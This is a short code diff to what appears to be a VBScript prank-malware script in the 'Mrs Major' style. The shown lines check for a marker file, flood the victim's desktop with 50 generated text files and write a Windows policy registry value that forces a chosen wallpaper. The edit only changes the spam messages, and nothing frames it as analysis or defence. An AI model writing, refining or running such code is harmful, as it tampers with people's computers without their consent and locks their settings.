@@ -17,8 +17,8 @@ if c.fileexists(""&ke&"\Doll_patch.xml") then
 else
 c.CreateTextFile""&ke&"\Doll_patch.xml"
 for nexfil=1 to 50
-set p=c.CreateTextFile(""&dsk&"\MRS MAJOR WANTS TO MEET YOU                  "&nexfil&".txt")
-p.write"MRS MAJOR IS BEHIND OF YOU!"
+set p=c.CreateTextFile(""&dsk&"\MAJOR IS WAITING                  "&nexfil&".txt")
+p.write"HELLO THERE! "
 p.close
 next
 x.RegWrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\system\wallpaper",""&tmp&"\@tile@@.jpg","REG_SZ"
@@ -131,6 +131,7 @@ end if
 
 
 loop
+
 
 
 
